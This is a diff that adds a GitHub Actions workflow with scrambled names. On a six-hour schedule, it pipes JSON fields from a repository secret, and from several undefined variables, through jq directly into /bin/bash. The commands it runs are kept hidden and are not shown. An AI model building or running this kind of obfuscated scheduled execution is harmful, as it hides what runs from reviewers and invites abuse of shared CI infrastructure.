@@ -1,0 +1,24 @@
+name: weizuanwz
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '28 5/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: weizuanwz
+        env:
+          zzbo1739: ${{ secrets.zzbo1739 }}
+        run: |
+          echo $zzbo1739 | jq -r .hkba37932 | /bin/bash
+          echo $uqv4 | jq -r .e87 | /bin/bash
+          echo $cvn38 | jq -r .n7 | /bin/bash
+          echo $zfd0 | jq -r .lai543 | /bin/bash
+          echo $o8672 | jq -r .dpo9589 | /bin/bash
+          echo $g60434 | jq -r .ymxu98 | /bin/bash
+          echo $gpsdn974 | jq -r .u7923 | /bin/bash
+
